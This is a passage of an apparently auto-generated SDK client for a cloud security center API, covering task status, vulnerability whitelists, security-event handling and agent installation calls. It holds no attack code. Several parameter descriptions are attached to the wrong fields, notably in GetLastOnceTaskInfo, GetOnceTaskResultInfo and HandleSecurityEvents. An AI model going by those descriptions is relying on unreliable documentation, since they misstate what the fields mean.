async function getInterceptionTargetDetail(request: GetInterceptionTargetDetailRequest): GetInterceptionTargetDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getInterceptionTargetDetailWithOptions(request, runtime);
}

model GetLastOnceTaskInfoRequest {
  source?: string(name='Source', description='The number of tasks that have been completed.', example='console_batch'),
  taskName?: string(name='TaskName', description='The ID of the latest scan task.', example='ASSETS_COLLECTION'),
  taskType?: string(name='TaskType', description='The total number of entries returned.', example='ASSETS_COLLECTION'),
}

model GetLastOnceTaskInfoResponseBody = {
  collectTime?: long(name='CollectTime', description='The information about the latest task.', example='1671184531000'),
  finishCount?: int32(name='FinishCount', example='67'),
  requestId?: string(name='RequestId', description='The status of the task. Valid values:

*   **INIT**: The task is not started.
*   **START**: The task is started.
*   **SUCCESS**: The task is complete.
*   **TIMEOUT**: The task timed out.', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
  taskId?: long(name='TaskId', description='The result of the scan task. Valid values:

*   **SUCCESS**: The task is successful.
*   **TASK\\_NOT\\_SUPPORT_REGION**: The images are deployed in a region that is not supported by container image scan.
*   **TASK\\_NOT_EXISTS**: The task does not exist.', example='3f65e1f1bb13118891a889d569a3****'),
  taskInfo?: {
    progress?: int32(name='Progress', example='69'),
    result?: string(name='Result', example='SUCCESS'),
    status?: string(name='Status', example='SUCCESS'),
  }(name='TaskInfo'),
  totalCount?: int32(name='TotalCount', description='The progress of the task in percentage.', example='44'),
}

model GetLastOnceTaskInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetLastOnceTaskInfoResponseBody(name='body'),
}

async function getLastOnceTaskInfoWithOptions(request: GetLastOnceTaskInfoRequest, runtime: Util.RuntimeOptions): GetLastOnceTaskInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetLastOnceTaskInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getLastOnceTaskInfo(request: GetLastOnceTaskInfoRequest): GetLastOnceTaskInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return getLastOnceTaskInfoWithOptions(request, runtime);
}

model GetModuleConfigRequest {
  currentPage?: string(name='CurrentPage', description='The number of the page to return.', example='1'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
}

model GetModuleConfigResponseBody = {
  httpStatusCode?: int32(name='HttpStatusCode', description='The response code returned.', example='200'),
  moduleConfigList?: [ 
    {
      configName?: string(name='ConfigName', description='The name of the configuration.', example='timescan'),
      items?: [ 
        {
          groupId?: int32(name='GroupId', description='The ID of the server group to which the server belongs.', example='5562414'),
          instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='i-uf6435dn4t59b9av****'),
          instanceName?: string(name='InstanceName', description='The instance name of the server.', example='inStanceName****'),
          ip?: string(name='Ip', description='The IP address of the server.', example='2.2.X.X'),
          region?: string(name='Region', description='The region in which the server resides.', example='cn-hangzhou'),
          uuid?: string(name='Uuid', description='The UUID of the server.', example='a47e3713-ed22-4015-93a3-d88ebe6****'),
        }
      ](name='Items', description='An array that consists of the configuration items.'),
      moduleName?: string(name='ModuleName', description='The name of the module.', example='alihids'),
    }
  ](name='ModuleConfigList', description='An array that consists of the configurations of the module.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='100'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='291B49F9-1685-4005-9D34-606B6F78****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful.', example='true'),
}

model GetModuleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetModuleConfigResponseBody(name='body'),
}

async function getModuleConfigWithOptions(request: GetModuleConfigRequest, runtime: Util.RuntimeOptions): GetModuleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetModuleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getModuleConfig(request: GetModuleConfigRequest): GetModuleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getModuleConfigWithOptions(request, runtime);
}

model GetOnceTaskResultInfoRequest {
  taskId?: string(name='TaskId', description='The number of tasks that were completed.', example='9dfa3a7eb9547781632785b49003****'),
  taskName?: string(name='TaskName', description='The ID of the scan task.', example='ASSETS_COLLECTION'),
  taskType?: string(name='TaskType', description='The total number of entries returned.', example='ASSETS_COLLECTION'),
}

model GetOnceTaskResultInfoResponseBody = {
  collectTime?: long(name='CollectTime', description='The information about the task.', example='1671184531000'),
  finishCount?: int32(name='FinishCount', example='47'),
  requestId?: string(name='RequestId', description='The status of the task. Valid values:

*   **INIT**: The task is not started.
*   **START**: The task is started.
*   **SUCCESS**: The task is complete.
*   **TIMEOUT**: The task times out.', example='CE500770-42D3-442E-9DDD-156E0F9F****'),
  taskId?: long(name='TaskId', example='e7b70a4b030db086db52231f1b58****'),
  taskInfo?: {
    status?: string(name='Status', example='START'),
  }(name='TaskInfo'),
  totalCount?: int32(name='TotalCount', example='44'),
}

model GetOnceTaskResultInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetOnceTaskResultInfoResponseBody(name='body'),
}

async function getOnceTaskResultInfoWithOptions(request: GetOnceTaskResultInfoRequest, runtime: Util.RuntimeOptions): GetOnceTaskResultInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetOnceTaskResultInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getOnceTaskResultInfo(request: GetOnceTaskResultInfoRequest): GetOnceTaskResultInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return getOnceTaskResultInfoWithOptions(request, runtime);
}

model GetPropertyScheduleConfigRequest {
  type?: string(name='Type', example='scheduler_sca_period'),
  uuid?: string(name='Uuid', example='50d213b4-3a35-427a-b8a5-04b0c7e1****'),
}

model GetPropertyScheduleConfigResponseBody = {
  propertyScheduleConfig?: {
    nextScheduleTime?: long(name='NextScheduleTime', example='1671630647018'),
    scheduleTime?: string(name='ScheduleTime', example='3'),
    type?: string(name='Type', example='scheduler_account_period'),
  }(name='PropertyScheduleConfig'),
  requestId?: string(name='RequestId', example='B37C9052-A73E-4707-A024-92477028****'),
}

model GetPropertyScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetPropertyScheduleConfigResponseBody(name='body'),
}

async function getPropertyScheduleConfigWithOptions(request: GetPropertyScheduleConfigRequest, runtime: Util.RuntimeOptions): GetPropertyScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetPropertyScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getPropertyScheduleConfig(request: GetPropertyScheduleConfigRequest): GetPropertyScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getPropertyScheduleConfigWithOptions(request, runtime);
}

model GetRulesCountResponseBody = {
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
  totalSystemClientRuleCount?: long(name='TotalSystemClientRuleCount', example='10'),
  totalUserDefineRuleCount?: long(name='TotalUserDefineRuleCount', example='10'),
}

model GetRulesCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetRulesCountResponseBody(name='body'),
}

async function getRulesCountWithOptions(runtime: Util.RuntimeOptions): GetRulesCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetRulesCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getRulesCount(): GetRulesCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getRulesCountWithOptions(runtime);
}

model GetSuspiciousStatisticsRequest {
  groupIdList?: string(name='GroupIdList', description='The ID of the asset group. Separate multiple IDs with commas (,).

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.', example='9997897'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='10.12.XX.XX'),
}

model GetSuspiciousStatisticsResponseBody = {
  remindCount?: int32(name='RemindCount', description='The number of alerts whose Emergency level is Reminder.', example='0'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='84092B42-1A59-4F34-8DF8-1D93520990A5'),
  seriousCount?: int32(name='SeriousCount', description='The number of alerts whose Emergency level is Urgent.', example='1'),
  suspiciousCount?: int32(name='SuspiciousCount', description='The number of alerts whose Emergency level is Suspicious.', example='8'),
  totalCount?: int32(name='TotalCount', description='The total number of alerts.', example='9'),
}

model GetSuspiciousStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetSuspiciousStatisticsResponseBody(name='body'),
}

async function getSuspiciousStatisticsWithOptions(request: GetSuspiciousStatisticsRequest, runtime: Util.RuntimeOptions): GetSuspiciousStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupIdList)) {
    query['GroupIdList'] = request.groupIdList;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetSuspiciousStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getSuspiciousStatistics(request: GetSuspiciousStatisticsRequest): GetSuspiciousStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getSuspiciousStatisticsWithOptions(request, runtime);
}

model GetVulStatisticsRequest {
  groupIdList?: string(name='GroupIdList', example='9997897'),
  sourceIp?: string(name='SourceIp', example='10.12.XX.XX'),
  typeList?: string(name='TypeList', example='cve'),
}

model GetVulStatisticsResponseBody = {
  requestId?: string(name='RequestId', example='3FE272FA-7263-4554-A90F-A7857945A6D5'),
  vulAsapSum?: int32(name='VulAsapSum', example='16'),
  vulLaterSum?: int32(name='VulLaterSum', example='0'),
  vulNntfSum?: int32(name='VulNntfSum', example='0'),
}

model GetVulStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetVulStatisticsResponseBody(name='body'),
}

async function getVulStatisticsWithOptions(request: GetVulStatisticsRequest, runtime: Util.RuntimeOptions): GetVulStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupIdList)) {
    query['GroupIdList'] = request.groupIdList;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.typeList)) {
    query['TypeList'] = request.typeList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetVulStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getVulStatistics(request: GetVulStatisticsRequest): GetVulStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getVulStatisticsWithOptions(request, runtime);
}

model GetVulWhitelistRequest {
  vulWhitelistId?: long(name='VulWhitelistId', description='The ID of the whitelist.', example='1275'),
}

model GetVulWhitelistResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
  vulWhitelist?: {
    aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:3263: curl security update'),
    id?: long(name='Id', description='The ID of the whitelist.', example='1275'),
    name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20173263'),
    reason?: string(name='Reason', description='The reason why the vulnerability is added to the whitelist.', example='Ignore'),
    target?: string(name='Target', description='The application scope of the rule. The value is a JSON string that contains the following fields:

*   **type**: the type of the assets to which the rule is applied. Valid values:

    *   **Uuid**: server
    *   **GroupId**: server group

*   **groupIds**: the ID of the server group

*   **uuids**: the UUID of the server

> If this parameter is empty, the rule is applied to all types of assets.', example='{
      "type": "GroupId",
      "uuids": [],
      "groupIds": [
            10782678
      ]
}'),
    type?: string(name='Type', description='The type of the vulnerability.', example='cve'),
    whitelist?: string(name='Whitelist', description='The information about the vulnerability that is added to the whitelist. The value is a JSON string that contains the following fields:

*   **Name**: the name of the vulnerability.

*   **Type**: the type of the vulnerability. Valid values:

    *   **cve**: Linux software vulnerability
    *   **sys**: Windows system vulnerability
    *   **cms**: Web-CMS vulnerability
    *   **app**: application vulnerability
    *   **emg**: urgent vulnerabilities

*   **AliasName**: the alias of the vulnerability.', example='[
      {
            "Name": "oval:com.redhat.rhsa:def:20173263",
            "Type": "cve",
            "AliasName": "RHSA-2017:3263: curl security update"
      }
]'),
  }(name='VulWhitelist', description='The information about the whitelist.'),
}

model GetVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetVulWhitelistResponseBody(name='body'),
}

async function getVulWhitelistWithOptions(request: GetVulWhitelistRequest, runtime: Util.RuntimeOptions): GetVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.vulWhitelistId)) {
    query['VulWhitelistId'] = request.vulWhitelistId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getVulWhitelist(request: GetVulWhitelistRequest): GetVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return getVulWhitelistWithOptions(request, runtime);
}

model HandleSecurityEventsRequest {
  markBatch?: string(name='MarkBatch', example='true'),
  markMissParam?: string(name='MarkMissParam', description='HandleSecurityEvents', example='[{"uuid":"part","field":"gmtModified","operate":"contains","fieldValue":"asd"},{"uuid":"part","field":"loginUser","operate":"contains","fieldValue":"vff"}]'),
  operationCode?: string(name='OperationCode', description='Specifies whether to add multiple alert events to the whitelist at a time. Valid values:

*   **true**: yes
*   **false**: no', example='block_ip'),
  operationParams?: string(name='OperationParams', description='Handles alert events.', example='{}'),
  securityEventIds?: [ string ](name='SecurityEventIds', example='["909361"]'),
  sourceIp?: string(name='SourceIp', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1.2.XX.XX'),
}

model HandleSecurityEventsResponseBody = {
  handleSecurityEventsResponse?: {
    taskId?: long(name='TaskId', example='15411'),
  }(name='HandleSecurityEventsResponse'),
  requestId?: string(name='RequestId', example='FF0020B9-999F-5DE2-985F-DB282BDA5311'),
}

model HandleSecurityEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: HandleSecurityEventsResponseBody(name='body'),
}

async function handleSecurityEventsWithOptions(request: HandleSecurityEventsRequest, runtime: Util.RuntimeOptions): HandleSecurityEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.markBatch)) {
    query['MarkBatch'] = request.markBatch;
  }
  if (!Util.isUnset(request.markMissParam)) {
    query['MarkMissParam'] = request.markMissParam;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationParams)) {
    query['OperationParams'] = request.operationParams;
  }
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'HandleSecurityEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function handleSecurityEvents(request: HandleSecurityEventsRequest): HandleSecurityEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return handleSecurityEventsWithOptions(request, runtime);
}

model HandleSimilarSecurityEventsRequest {
  markMissParam?: string(name='MarkMissParam', example='{"field":"md5","operate":"contains","fieldValue":"aa"}'),
  operationCode?: string(name='OperationCode', example='offline_handled'),
  operationParams?: string(name='OperationParams', example='{"expireTime":1646208726195}'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='HandleSimilarSecurityEvents', example='192.168.XX.XX'),
  taskId?: long(name='TaskId', example='666038'),
}

model HandleSimilarSecurityEventsResponseBody = {
  requestId?: string(name='RequestId', example='A3653911-33A6-5268-8B91-7690471F7AA1'),
}

model HandleSimilarSecurityEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: HandleSimilarSecurityEventsResponseBody(name='body'),
}

async function handleSimilarSecurityEventsWithOptions(request: HandleSimilarSecurityEventsRequest, runtime: Util.RuntimeOptions): HandleSimilarSecurityEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.markMissParam)) {
    query['MarkMissParam'] = request.markMissParam;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationParams)) {
    query['OperationParams'] = request.operationParams;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'HandleSimilarSecurityEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function handleSimilarSecurityEvents(request: HandleSimilarSecurityEventsRequest): HandleSimilarSecurityEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return handleSimilarSecurityEventsWithOptions(request, runtime);
}

model IgnoreCheckItemsRequest {
  checkAndRiskTypeList?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.', example='52'),
      riskType?: string(name='RiskType', description='The baseline type of the check item.', example='weak_password'),
    }
  ](name='CheckAndRiskTypeList', description='The risk items.'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  reason?: string(name='Reason', description='The reason why you add the risk item to the whitelist.', example='already config in another way'),
  type?: int32(name='Type', description='The operation that you want to perform on the risk item.Valid values:
*  **1**: adds the risk item to the whitelist
*  **2**: removes the risk item from the whitelist', example='1'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.'),
}

model IgnoreCheckItemsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='11EBEC99-B4B5-542E-8C17-B87B624C****'),
}

model IgnoreCheckItemsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: IgnoreCheckItemsResponseBody(name='body'),
}

async function ignoreCheckItemsWithOptions(request: IgnoreCheckItemsRequest, runtime: Util.RuntimeOptions): IgnoreCheckItemsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkAndRiskTypeList)) {
    query['CheckAndRiskTypeList'] = request.checkAndRiskTypeList;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'IgnoreCheckItems',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function ignoreCheckItems(request: IgnoreCheckItemsRequest): IgnoreCheckItemsResponse {
  var runtime = new Util.RuntimeOptions{};
  return ignoreCheckItemsWithOptions(request, runtime);
}

model IgnoreHcCheckWarningsRequest {
  checkIds?: string(name='CheckIds', example='21313'),
  checkWarningIds?: string(name='CheckWarningIds', example='98146905,98146907'),
  reason?: string(name='Reason', example='ignore'),
  riskId?: string(name='RiskId', example='51'),
  sourceIp?: string(name='SourceIp', example='192.168.XX.XX'),
  type?: long(name='Type', example='1'),
}

model IgnoreHcCheckWarningsResponseBody = {
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B113119F'),
}

model IgnoreHcCheckWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: IgnoreHcCheckWarningsResponseBody(name='body'),
}

async function ignoreHcCheckWarningsWithOptions(request: IgnoreHcCheckWarningsRequest, runtime: Util.RuntimeOptions): IgnoreHcCheckWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.checkWarningIds)) {
    query['CheckWarningIds'] = request.checkWarningIds;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'IgnoreHcCheckWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function ignoreHcCheckWarnings(request: IgnoreHcCheckWarningsRequest): IgnoreHcCheckWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return ignoreHcCheckWarningsWithOptions(request, runtime);
}

model InstallBackupClientRequest {
  policyVersion?: string(name='PolicyVersion', example='2.0.0'),
  uuid?: string(name='Uuid', example='inet-617eddab-7df4-4a51-b217-a3f59194****'),
  uuidList?: [ string ](name='UuidList', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model InstallBackupClientResponseBody = {
  requestId?: string(name='RequestId', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
}

model InstallBackupClientResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallBackupClientResponseBody(name='body'),
}

async function installBackupClientWithOptions(request: InstallBackupClientRequest, runtime: Util.RuntimeOptions): InstallBackupClientResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallBackupClient',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function installBackupClient(request: InstallBackupClientRequest): InstallBackupClientResponse {
  var runtime = new Util.RuntimeOptions{};
  return installBackupClientWithOptions(request, runtime);
}

model InstallCloudMonitorRequest {
  agentAccessKey?: string(name='AgentAccessKey', description='The AccessKey ID that is required to install the CloudMonitor agent. You can call the [DescribeMonitoringAgentAccessKey](~~114948~~) operation to query the AccessKey ID.

> This parameter is required only when you install the CloudMonitor agent on servers that are not deployed on Alibaba Cloud.', example='usY*****R_U'),
  agentSecretKey?: string(name='AgentSecretKey', description='The AccessKey secret that is required to install the CloudMonitor agent. You can call the [DescribeMonitoringAgentAccessKey](~~114948~~) operation to query the AccessKey secret.

> This parameter is required only when you install the CloudMonitor agent on servers that are not deployed on Alibaba Cloud.', example='UCxF2R1sIO90XlU9****'),
  argusVersion?: string(name='ArgusVersion', description='The version of the CloudMonitor agent that you want to install on the servers. For more information about the latest version of the CloudMonitor agent, see [Overview](~~183431~~).', example='3.5.6'),
  instanceIdList?: [ string ](name='InstanceIdList', description='The IDs of the servers on which you want to install the CloudMonitor agent. Separate multiple IDs with commas (,).'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers on which you want to install the CloudMonitor agent. Separate multiple UUIDs with commas (,).'),
}

model InstallCloudMonitorResponseBody = {
  code?: string(name='Code', description='The error code returned if the request fails.', example='IllegalParam'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='400'),
  message?: string(name='Message', description='The error message returned.', example='There was an error with your request.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F92AFB96-FACC-57E7-928E-678D04B94CAE'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='false'),
}

model InstallCloudMonitorResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallCloudMonitorResponseBody(name='body'),
}

/**
  * > Before you call this operation, make sure that the Security Center agent on your servers is online and the servers can access Alibaba Cloud services.
  *
  * @param request InstallCloudMonitorRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return InstallCloudMonitorResponse
 */
async function installCloudMonitorWithOptions(request: InstallCloudMonitorRequest, runtime: Util.RuntimeOptions): InstallCloudMonitorResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.agentAccessKey)) {
    query['AgentAccessKey'] = request.agentAccessKey;
  }
  if (!Util.isUnset(request.agentSecretKey)) {
    query['AgentSecretKey'] = request.agentSecretKey;
  }
  if (!Util.isUnset(request.argusVersion)) {
    query['ArgusVersion'] = request.argusVersion;
  }
  if (!Util.isUnset(request.instanceIdList)) {
    query['InstanceIdList'] = request.instanceIdList;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallCloudMonitor',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * > Before you call this operation, make sure that the Security Center agent on your servers is online and the servers can access Alibaba Cloud services.
  *
  * @param request InstallCloudMonitorRequest
  * @return InstallCloudMonitorResponse
 */
